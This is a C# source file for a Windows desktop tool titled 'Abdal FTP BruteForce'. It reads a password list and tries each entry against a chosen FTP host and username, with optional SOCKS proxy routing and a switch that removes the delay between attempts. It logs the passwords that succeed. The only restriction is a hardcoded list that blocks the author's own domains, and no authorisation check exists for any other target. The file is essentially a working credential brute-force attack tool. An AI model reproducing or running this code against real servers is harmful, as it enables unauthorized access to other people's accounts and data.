using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Telerik.WinControls.UI;
using Abdal_Admin_Finder;
using Telerik.WinControls;


namespace Abdal_Security_Group_App
{
    public partial class Abdal_Admin_Finder : Telerik.WinControls.UI.RadForm
    {

      private  string password_file_name = "";
      private string[] password_file_line = new string[] { };




        public Abdal_Admin_Finder()
        {
            InitializeComponent();
            Version version = Assembly.GetExecutingAssembly().GetName().Version;
            Text = "Abdal FTP BruteForce" + " " + version.Major + "." + version.Minor; //change form title
            bgWorker_ftp_attack.WorkerReportsProgress = true;
            bgWorker_ftp_attack.WorkerSupportsCancellation = true;
        }

        private void EncryptToggleSwitch_ValueChanged(object sender, EventArgs e)
        {
            
        }

 
        private void Abdal_2Key_Triple_DES_Builder_Load(object sender, EventArgs e)
        {
            // Call Global Chilkat Unlock
            Abdal_Security_Group_App.GlobalUnlockChilkat GlobalUnlock = new Abdal_Security_Group_App.GlobalUnlockChilkat();
            GlobalUnlock.unlock();

        }

        private void radMenuItem1_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
           
        }

        

        private void randButton_Click(object sender, EventArgs e)
        {

           

        }

        private void radButton1_Click(object sender, EventArgs e)
        {
            success_passwordRichTextBox.Items.Clear();
            success_password_links_text.Text = "0";
            AbdalControler.stop_force_process = false;
            success_passwordRichTextBox.Text = "";

            string[] DangerNameArray = { "abdal",
                "ebrasha",
                "hackers.zone",
                "mambanux",
                "nahaanbin",
                "blackwin"};

            // Check Target Url
            foreach (var DangerName in DangerNameArray)
            {

                new Thread(() =>
                {
                    Regex regex = new Regex(@"" + DangerName + ".*");
                    
                        if (regex.Match(ftpServerTextBox.Text.ToLower()).Success)
                        {

                           AbdalControler.unauthorized_process = true;
                            
                            
                        }

                    

                }).Start();


            }


            



           if (AbdalControler.unauthorized_process == true)
            {
                MessageBox.Show("This domain is unauthorized !");
                
            }
            else
            {
                if (bgWorker_ftp_attack.IsBusy != true)
                {

                    using (var soundPlayer = new SoundPlayer(@"start.wav"))
                    {
                        soundPlayer.PlaySync(); // can also use soundPlayer.Play()
                    }

                    LogAttackTextEditor.Text = "";
                    radProgressBar1.Value1 = 0;
                    radProgressBar1.Value2 = 0;
                    // Start the asynchronous operation.
                    bgWorker_ftp_attack.RunWorkerAsync();
                }
            }

       




        }

        private void cancelPenTest_Click(object sender, EventArgs e)
        {
           AbdalControler.stop_force_process = true;
            if (bgWorker_ftp_attack.WorkerSupportsCancellation == true)
            {
                // Cancel the asynchronous operation.
                bgWorker_ftp_attack.CancelAsync();
            }


        }

       

        private void bgWorker_req_maker_DoWork(object sender, DoWorkEventArgs e)
        {
            
            

            Chilkat.Ftp2 ftp = new Chilkat.Ftp2();
            bool success = false;

            if (ftpServerTextBox.Text == "")
            {
                MessageBox.Show("FTP Target Is Not valid !");
            }
            else if (AbdalControler.unauthorized_process == true)
            {
                MessageBox.Show("This domain is unauthorized !");
                Application.Exit();


            }
            else
            {

                try
                {



                   

                    int success_password_counter = 0;

                   

                    radRadialGauge.RangeEnd = this.password_file_line.Length;
                    for (int counter = 0; counter <= this.password_file_line.Length; counter++)
                    {
                        if (AbdalControler.stop_force_process == true)
                        {
                            break;
                        }

                        if (FastTrafficGenToggleSwitch.Value == false)
                        {
                            System.Threading.Thread.Sleep(500);
                        }



                        if (this.password_file_line[counter] != "")
                        {
                            radRadialGauge.Value = counter;
                            ftp.Hostname = ftpServerTextBox.Text;
                            ftp.Username = ftpUserNameTextBox.Text;
                            ftp.Password = this.password_file_line[counter];
                            ftp.Port = Convert.ToInt32(ftpPortTextBox.Text);
                            ftp.ConnectTimeout = 10;
                            

                            if(SOCKS_ToggleSwitch.Value == true)
                            {
                                        ftp.SocksHostname = SOCKSServerTextBox.Text;
                                        ftp.SocksPort = Convert.ToInt32(SocksPortTextBox.Text); ;
                                        ftp.SocksUsername = SocksUserNameTextBox.Text;
                                        ftp.SocksPassword = SocksPasswordTextBox.Text;
                                        if (SocksVersionDropDownList.Text == "SOCKS 5")
                                        {
                                            ftp.SocksVersion = 5;
                                        }
                                        else
                                        {
                                            ftp.SocksVersion = 4;
                                        }

                            }


                            success = ftp.Connect();
                            if (success == true)
                            {
                                success_password_counter++;
                                success_passwordRichTextBox.Items.Add("[+] "+ftpUserNameTextBox.Text + " >>" + " " + this.password_file_line[counter]);
                                success_password_links_text.Text = success_password_counter.ToString();
                                using (var soundPlayer = new SoundPlayer(@"pass-foun.wav"))
                                {
                                    soundPlayer.PlaySync(); // can also use soundPlayer.Play()
                                }
                                ftp.Disconnect();
                            }
                            else
                            {
                                //ftp.LastErrorText
                                LogAttackTextEditor.AppendText("[-] " + ftpUserNameTextBox.Text +" >>"+" " +this.password_file_line[counter] + Environment.NewLine);
                                LogAttackTextEditor.SelectionStart = LogAttackTextEditor.Text.Length;
                                LogAttackTextEditor.ScrollToCaret();

                                ftp.Disconnect();
                                
                            }

                           







                        }

                    }




                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }

            } // End else

        }

        private void bgWorker_req_maker_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            //radProgressBar1.Value2 = e.ProgressPercentage;
             
//            radRadialGauge1.Value = e.ProgressPercentage;
        }

        private void bgWorker_req_maker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            


            if (e.Cancelled == true)
                    {
                this.radDesktopAlert1.CaptionText = "Abdal FTP BruteForce";
                this.radDesktopAlert1.ContentText = "Canceled Process By User!";
                this.radDesktopAlert1.Show();
                using (var soundPlayer = new SoundPlayer(@"cancel.wav"))
                {
                    soundPlayer.PlaySync(); // can also use soundPlayer.Play()
                }
            }
            else if (e.Error != null)
                    {
                this.radDesktopAlert1.CaptionText = "Abdal FTP BruteForce";
                this.radDesktopAlert1.ContentText = e.Error.Message;
                this.radDesktopAlert1.Show();

                using (var soundPlayer = new SoundPlayer(@"error.wav"))
                {
                    soundPlayer.PlaySync(); // can also use soundPlayer.Play()
                }


            }
            else
                    {
                this.radDesktopAlert1.CaptionText = "Abdal FTP BruteForce";
                this.radDesktopAlert1.ContentText = "Done!";
                this.radDesktopAlert1.Show();
                using (var soundPlayer = new SoundPlayer(@"done.wav"))
                {
                    soundPlayer.PlaySync(); // can also use soundPlayer.Play()
                }

            }

        }

        private void radRadialGauge1_Click(object sender, EventArgs e)
        {

        }

        private void radButton1_Click_1(object sender, EventArgs e)
        {
           
        }

        private void radButton1_Click_2(object sender, EventArgs eSpider)
        {
            
 
            
        }

        private void radButton2_Click(object sender, EventArgs eSpider)
        {
        }

        private void bgWorker_spider_DoWork(object sender, DoWorkEventArgs eSpidere)
        {

            
           

        }

        private void bgWorker_spider_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs eSpider)
        {



        }

        private void bgWorker_spider_ProgressChanged(object sender, ProgressChangedEventArgs eSpider)
        {
           
        }

        private void radLinearGauge1_Click(object sender, EventArgs e)
        {

        }

        private void radLabel5_Click(object sender, EventArgs e)
        {

        }

        private void radButton1_Click_3(object sender, EventArgs e)
        {
            try
            {

                openFileDialogPasswordFile.AddExtension = false;
                openFileDialogPasswordFile.Title = "FTP Password Attack File";
                openFileDialogPasswordFile.DefaultExt = "txt";
                openFileDialogPasswordFile.Filter = "txt files (*.txt)|*.txt";
                openFileDialogPasswordFile.CheckFileExists = true;
                openFileDialogPasswordFile.CheckPathExists = true;
                openFileDialogPasswordFile.ShowDialog();

                this.password_file_name = openFileDialogPasswordFile.FileName;
                this.password_file_line = File.ReadAllLines(this.password_file_name);

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
      

        }

        
    }
}
